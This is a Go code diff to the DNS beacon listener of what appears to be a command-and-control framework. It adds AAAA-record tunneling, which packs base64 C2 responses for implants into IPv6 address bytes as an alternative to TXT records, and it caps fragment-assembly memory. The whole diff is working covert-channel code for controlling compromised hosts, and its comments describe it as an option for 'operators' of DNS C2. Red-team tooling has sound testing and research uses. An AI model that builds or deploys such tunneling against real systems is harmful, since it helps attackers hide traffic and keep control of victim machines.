@@ -27,6 +27,10 @@ const (
 	dnsFragMaxTotal = 64
 	// dnsFragTTL drops incomplete assemblies after 30s of inactivity.
 	dnsFragTTL = 30 * time.Second
+	// maxDNSFragments caps the number of *distinct* in-flight assemblies to
+	// bound memory against a flood of distinct (spoofable UDP) agent-ID labels.
+	// When at capacity, the oldest incomplete assembly is evicted.
+	maxDNSFragments = 4096
 )
 
 // dnsFragState holds partially-received fragments for one agent beacon.
@@ -195,7 +199,9 @@ func (dl *DNSBeaconListener) handleQuery(w dns.ResponseWriter, r *dns.Msg) {
 	case dns.TypeA:
 		dl.handleAType(w, r)
 	case dns.TypeTXT:
-		dl.handleTXTType(w, r)
+		dl.handleDNSQuery(w, r, false)
+	case dns.TypeAAAA:
+		dl.handleDNSQuery(w, r, true)
 	default:
 		m := new(dns.Msg)
 		m.SetReply(r)
@@ -217,7 +223,11 @@ func (dl *DNSBeaconListener) handleAType(w dns.ResponseWriter, r *dns.Msg) {
 	w.WriteMsg(m)
 }
 
-// handleTXTType processes beacon TXT queries.
+// handleDNSQuery processes beacon TXT or AAAA queries (useAAAA selects the
+// response record type). AAAA tunneling packs the same base64-encoded response
+// into 16-byte AAAA rdata chunks (the IPv6 address bytes are ASCII base64 text),
+// giving operators an alternative to TXT-based DNS C2.
+//
 // Query format (fragmented): <hex-uuid>.<total_index>.<base32frag>... .dns.<domain>
 //
 //	<hex-uuid>:  32 hex chars (UUID without dashes)
@@ -229,19 +239,19 @@ func (dl *DNSBeaconListener) handleAType(w dns.ResponseWriter, r *dns.Msg) {
 // Legacy queries without the metadata label are still accepted as a single
 // (unfragmented) base32 payload for compatibility with older implants.
 //
-// Response TXT: base64-encoded beaconResponse JSON (split into 255-char chunks)
-func (dl *DNSBeaconListener) handleTXTType(w dns.ResponseWriter, r *dns.Msg) {
+// Response: base64-encoded beaconResponse JSON, split into 255-char (TXT) or
+// 16-char (AAAA) chunks.
+func (dl *DNSBeaconListener) handleDNSQuery(w dns.ResponseWriter, r *dns.Msg, useAAAA bool) {
 	m := new(dns.Msg)
 	m.SetReply(r)
 
 	qname := strings.TrimSuffix(r.Question[0].Name, ".")
-
 	// Strip the domain suffix to get the agent prefix
 	prefix := strings.ToLower(qname)
 	domainLower := strings.ToLower(dl.Domain)
 	idx := strings.LastIndex(prefix, ".dns."+domainLower)
 	if idx < 0 {
-		addTXTRecord(m, r.Question[0].Name, "")
+		addDNSRecord(m, r.Question[0].Name, "", useAAAA)
 		w.WriteMsg(m)
 		return
 	}
@@ -249,7 +259,7 @@ func (dl *DNSBeaconListener) handleTXTType(w dns.ResponseWriter, r *dns.Msg) {
 	// Get everything before ".dns."
 	agentPart := prefix[:idx]
 	if agentPart == "" {
-		addTXTRecord(m, r.Question[0].Name, "")
+		addDNSRecord(m, r.Question[0].Name, "", useAAAA)
 		w.WriteMsg(m)
 		return
 	}
@@ -273,8 +283,8 @@ func (dl *DNSBeaconListener) handleTXTType(w dns.ResponseWriter, r *dns.Msg) {
 		}
 		if !complete {
 			// Still awaiting remaining fragments: acknowledge quietly with a
-			// blank TXT so the agent keeps sending without a hard failure.
-			addTXTRecord(m, r.Question[0].Name, "")
+			// blank record so the agent keeps sending without a hard failure.
+			addDNSRecord(m, r.Question[0].Name, "", useAAAA)
 			w.WriteMsg(m)
 			return
 		}
@@ -292,7 +302,7 @@ func (dl *DNSBeaconListener) handleTXTType(w dns.ResponseWriter, r *dns.Msg) {
 		}
 	}
 
-	dl.processBeacon(agentID, requestData, m, r)
+	dl.processBeacon(agentID, requestData, m, r, useAAAA)
 	w.WriteMsg(m)
 }
 
@@ -340,6 +350,24 @@ func (dl *DNSBeaconListener) collectFragment(agentID, meta string, dataLabels []
 	dl.fragMu.Lock()
 	defer dl.fragMu.Unlock()
 
+	// Enforce the distinct-assembly cardinality cap before allocating a new
+	// entry. A flood of unique (spoofable) agent-ID labels could otherwise
+	// grow the map without bound. Evict the oldest incomplete assembly.
+	if _, exists := dl.frags[agentID]; !exists && len(dl.frags) >= maxDNSFragments {
+		oldestID := ""
+		var oldest time.Time
+		first := true
+		for id, st := range dl.frags {
+			if first || st.last.Before(oldest) {
+				oldest, oldestID = st.last, id
+				first = false
+			}
+		}
+		if oldestID != "" {
+			delete(dl.frags, oldestID)
+		}
+	}
+
 	st := dl.frags[agentID]
 	if st == nil || st.total != total {
 		st = &dnsFragState{total: total, parts: make(map[int][]byte, total)}
@@ -365,9 +393,9 @@ func (dl *DNSBeaconListener) collectFragment(agentID, meta string, dataLabels []
 	return buf.Bytes(), true, true
 }
 
-func (dl *DNSBeaconListener) processBeacon(agentID string, requestData []byte, m *dns.Msg, r *dns.Msg) {
+func (dl *DNSBeaconListener) processBeacon(agentID string, requestData []byte, m *dns.Msg, r *dns.Msg, useAAAA bool) {
 	if dl.handler == nil {
-		addTXTRecord(m, r.Question[0].Name, "")
+		addDNSRecord(m, r.Question[0].Name, "", useAAAA)
 		return
 	}
 
@@ -381,14 +409,14 @@ func (dl *DNSBeaconListener) processBeacon(agentID string, requestData []byte, m
 		reqJSON, err = json.Marshal(reqMap)
 		if err != nil {
 			slog.Error("Failed to marshal DNS request", "agent", agentID, "err", err)
-			addTXTRecord(m, r.Question[0].Name, "")
+			addDNSRecord(m, r.Question[0].Name, "", useAAAA)
 			return
 		}
 	}
 
 	respJSON := dl.handler(agentID, reqJSON)
 	encoded := base64.StdEncoding.EncodeToString(respJSON)
-	addTXTRecord(m, r.Question[0].Name, encoded)
+	addDNSRecord(m, r.Question[0].Name, encoded, useAAAA)
 }
 
 func addTXTRecord(m *dns.Msg, name string, value string) {
@@ -405,6 +433,40 @@ func addTXTRecord(m *dns.Msg, name string, value string) {
 		if err != nil {
 			slog.Error("DNS NewRR failed", "err", err)
 			continue
+		}
+		m.Answer = append(m.Answer, rr)
+	}
+}
+
+// addDNSRecord appends the response payload using either TXT or AAAA records,
+// depending on useAAAA. AAAA tunneling packs the base64 payload into 16-byte
+// AAAA rdata chunks; the trailing bytes of the final (padded) chunk are spaces,
+// which the agent strips before base64-decoding.
+func addDNSRecord(m *dns.Msg, name string, value string, useAAAA bool) {
+	if useAAAA {
+		addAAAARecord(m, name, value)
+	} else {
+		addTXTRecord(m, name, value)
+	}
+}
+
+// addAAAARecord splits value into 16-byte (IPv6 rdata) chunks, each carrying a
+// slice of the ASCII base64 payload. Chunks shorter than 16 bytes are
+// right-padded with spaces so every AAAA record is a valid 16-byte address.
+func addAAAARecord(m *dns.Msg, name string, value string) {
+	if value == "" {
+		value = " "
+	}
+	for i := 0; i < len(value); i += 16 {
+		end := i + 16
+		if end > len(value) {
+			end = len(value)
+		}
+		chunk := []byte("                ")
+		copy(chunk, value[i:end])
+		rr := &dns.AAAA{
+			Hdr:  dns.RR_Header{Name: name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: 60},
+			AAAA: net.IP(chunk),
 		}
 		m.Answer = append(m.Answer, rr)
 	}
